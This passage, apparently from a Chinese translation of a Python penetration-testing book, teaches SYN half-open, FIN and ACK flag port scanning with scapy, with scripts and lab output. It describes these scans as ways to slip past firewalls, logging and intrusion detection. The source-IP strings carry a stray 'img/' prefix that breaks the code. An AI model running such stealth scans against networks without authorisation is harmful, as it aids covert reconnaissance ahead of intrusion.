# 使用自定义数据包构造测试安全系统

在本节中，我们将看到一些特殊类型的扫描。在第二章中，*扫描渗透*，你看到了基于 TCP 连接扫描的端口扫描器。三次握手是 TCP 连接扫描的基本概念。

# 半开放扫描

半开放扫描或隐形扫描，顾名思义，是一种特殊类型的扫描。隐形扫描技术用于绕过防火墙规则，并避免被日志系统检测到。然而，这是一种特殊类型的扫描，通过数据包构造来实现，这在本章前面已经解释过。如果你想制作 IP 或 TCP 数据包，那么你必须提到每个部分。我知道这很痛苦，你可能会想到*Hping*。然而，Python 的库会让它变得简单。

现在，让我们来看一下如何使用 scapy。Scapy 是一个第三方库，允许你制作定制的数据包。我们将编写一个简单而简短的代码，以便你能够理解 scapy。

在编写代码之前，让我们了解一下半开放扫描的概念。以下步骤定义了隐形扫描：

1.  客户端向目标端口发送一个 SYN 数据包

1.  如果端口是打开的，服务器会用`SYN`/`ACK`数据包进行响应

1.  如果服务器用`RST`数据包进行响应，这意味着端口是关闭的

1.  客户端发送`RST`来关闭初始化

现在，让我们来看一下代码，接下来也会进行解释：

```py
from scapy.all import *
ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.3" )
tcp1 = TCP(sport =1024, dport=80, flags="S", seq=12345)
packet = ip1/tcp1
p =sr1(packet, inter=1)
p.show()

rs1 = TCP(sport =1024, dport=80, flags="R", seq=12347)
packet1=ip1/rs1
p1 = sr1(packet1)
p1.show
```

第一行导入了 scapy 的所有模块。下一行，`ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.3" )`，定义了 IP 数据包。IP 数据包的名称是`ip1`，其中包含了源地址和目的地址。`tcp1 = TCP(sport =1024, dport=80, flags="S", seq=12345)`语句定义了名为`tcp1`的`TCP`数据包，该数据包包含了源端口和目的端口。我们对端口`80`感兴趣，因为我们已经定义了隐形扫描的前几步。在第一步中，客户端向服务器发送一个`SYN`数据包。在我们的`tcp1`数据包中，`SYN`标志已经设置如数据包所示，并且 seq 是随机给定的。

下一行，`packet= ip1/tcp1`，首先安排 IP，然后是`TCP`。`p =sr1(packet, inter=1)`语句接收数据包。`sr1()`函数使用发送和接收的数据包，但它只接收一个应答数据包，`inter= 1`，这表示一个间隔为一秒，因为我们希望两个数据包之间有一秒的间隔。下一行，`p.show()`，给出了接收数据包的分层视图。`rs1 = TCP(sport =1024, dport=80, flags="R", seq=12347)`语句将发送带有`RST`标志的数据包。接下来的几行很容易理解。在这里，不需要`p1.show`，因为我们不接受服务器的任何响应。

输出如下：

```py
  root@Mohit|Raj:/scapy# python halfopen.py
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  .*Finished to send 1 packets.
  Received 2 packets, got 1 answers, remaining 0 packets
  ###[ IP ]###
    version   = 4L
    ihl       = 5L
    tos       = 0x0
    len       = 44
    id        = 0
    flags     = DF
    frag      = 0L
    ttl       = 64
    proto     = tcp
    chksum    = 0xb96e
    src       = 192.168.0.3
    dst       = 192.168.0.10
  options 
  ###[ TCP ]###
       sport     = http
       dport     = 1024
       seq       = 2065061929
       ack       = 12346
       dataofs   = 6L
       reserved  = 0L
       flags     = SA
       window    = 5840
       chksum    = 0xf81e
       urgptr    = 0
       options   = [('MSS', 1460)]
  ###[ Padding ]###
          load      = 'x00x00'
  Begin emission:
  Finished to send 1 packets.
  ..^Z
  [10]+  Stopped python halfopen.py
```

所以我们收到了我们的应答数据包。源和目的地看起来都很好。看一下`TCP`字段，注意标志的值。我们有 SA，表示`SYN`和`ACK`标志。正如我们之前讨论的，如果服务器响应带有`SYN`和`ACK`标志，这意味着端口是打开的。*Wireshark*也捕获了响应，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/e98f4962-63b4-4a9f-8079-19212937f167.png)

Wireshark 输出

现在，让我们再做一次，但是这次目的地将不同。从输出中，你将知道目的地地址是什么：

```py
  root@Mohit|Raj:/scapy# python halfopen.py 
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  .*Finished to send 1 packets.
  Received 2 packets, got 1 answers, remaining 0 packets
  ###[ IP ]###
    version   = 4L
    ihl       = 5L
    tos       = 0x0
    len       = 40
    id        = 37929
  flags     = 
    frag      = 0L
    ttl       = 128
    proto     = tcp
    chksum    = 0x2541
    src       = 192.168.0.11
    dst       = 192.168.0.10
  options 
  ###[ TCP ]###
       sport     = http
       dport     = 1024
       seq       = 0
       ack       = 12346
       dataofs   = 5L
       reserved  = 0L
       flags     = RA
       window    = 0
       chksum    = 0xf9e0
       urgptr    = 0
       options   = {}
  ###[ Padding ]###
          load      = 'x00x00x00x00x00x00'
  Begin emission:
  Finished to send 1 packets.
  ^Z
  [12]+  Stopped                 python halfopen.py
  root@Mohit|Raj:/scapy#
```

这一次，它返回了`RA`标志，意味着`RST`和`ACK`。这意味着端口是关闭的。

# FIN 扫描

有时防火墙和**入侵检测系统**（**IDS**）被配置为检测`SYN`扫描。在 FIN 扫描攻击中，向远程主机发送一个只有 FIN 标志的`TCP`数据包。如果主机没有响应，这意味着端口是开放的。如果收到响应，其中包含`RST`/`ACK`标志，这意味着端口是关闭的。

以下是 FIN 扫描的代码：

```py
from scapy.all import *
ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.11")
sy1 = TCP(sport =1024, dport=80, flags="F", seq=12345)
packet = ip1/sy1
p =sr1(packet)
p.show()
```

数据包与之前的相同，只有 FIN 标志设置。现在，检查来自不同机器的响应：

```py
root@Mohit|Raj:/scapy# python fin.py 
WARNING: No route found for IPv6 destination :: (no default route?)
Begin emission:
.Finished to send 1 packets.
*
Received 2 packets, got 1 answers, remaining 0 packets
###[ IP ]###
  version   = 4L
  ihl       = 5L
  tos       = 0x0
  len       = 40
  id        = 38005
  flags     = 
  frag      = 0L
  ttl       = 128
  proto     = tcp
  chksum    = 0x24f5
  src       = 192.168.0.11
  dst       = 192.168.0.10
  options   
###[ TCP ]###
     sport     = http
     dport     = 1024
     seq       = 0
     ack       = 12346
     dataofs   = 5L
     reserved  = 0L
     flags     = RA
     window    = 0
     chksum    = 0xf9e0
     urgptr    = 0
     options   = {}
###[ Padding ]###
        load      = 'x00x00x00x00x00x00'
```

传入的数据包包含`RST`/`ACK`标志，这意味着端口是关闭的。现在，我们将目的地更改为`192.168.0.3`并检查响应：

```py
root@Mohit|Raj:/scapy# python fin.py 
WARNING: No route found for IPv6 destination :: (no default route?)
Begin emission:
.Finished to send 1 packets.
....^Z
[13]+  Stopped                 python fin.py
```

从目的地没有收到响应，这意味着端口是开放的。

# ACK 标志扫描

`ACK`扫描方法用于确定主机是否受到某种过滤系统的保护。

在这种扫描方法中，攻击者发送带有随机序列号的`ACK`探测数据包，没有响应意味着端口被过滤（在这种情况下存在有状态检查防火墙）；如果收到 RST 响应，这意味着端口是关闭的。

现在，让我们浏览一下这段代码：

```py
from scapy.all import *
ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.11")
sy1 = TCP(sport =1024, dport=137, flags="A", seq=12345)
packet = ip1/sy1
p =sr1(packet)
p.show()
```

在上述代码中，标志已设置为`ACK`，目的地端口为`137`。

现在，检查输出：

```py
  root@Mohit|Raj:/scapy# python ack.py 
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  ..Finished to send 1 packets.
  ^Z
  [30]+  Stopped                 python ack.py
```

数据包已发送，但没有收到响应。您不需要担心，因为我们有我们的 Python 嗅探器来检测响应。因此运行嗅探器，无需以混杂模式运行它，并重新发送`ACK`数据包：

```py
  Out-put of sniffer 
   --------Ethernet Frame--------
  desination mac 000c294f8e35
  Source mac 000c292e847a
  -----------IP------------------
  TTL : 128
  Source IP 192.168.0.11
  Destination IP 192.168.0.10
  ---------TCP----------
  Source Port  137
  Destination port  1024
  Flag  04
```

返回的数据包显示`Flag 04`，意味着`RST`。这意味着端口没有被过滤。

让我们设置防火墙，再次检查`ACK`数据包的响应。现在防火墙已设置好，让我们再次发送数据包。输出将如下所示：

```py
  root@Mohit|Raj:/scapy# python ack.py 
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  .Finished to send 1 packets.
```

嗅探器的输出显示没有任何内容，这意味着防火墙存在。

# 总结

在本章的开头，我们学习了嗅探器的概念，以及在网络上使用嗅探器，有时可能会揭示密码和聊天等重要信息。在今天的世界中，大多数情况下使用交换机，因此您应该知道如何执行主动嗅探。我们还学习了如何制作一个第 4 层嗅探器。然后我们学习了如何执行 ARP 欺骗。您应该通过 ARP 欺骗测试网络，并将您的发现写入报告。然后，我们研究了使用自定义数据包测试网络的主题。网络脱离攻击类似于 ARP 缓存中毒攻击，这也有所解释。半开放、FIN 扫描和`ACK`标志扫描是我们也涉及到的特殊类型的扫描。最后，解释了与 DDOS 攻击相关的死亡之针。

在第四章中，*网络攻击和防范*，我们将学习网络攻击和防范网络攻击。
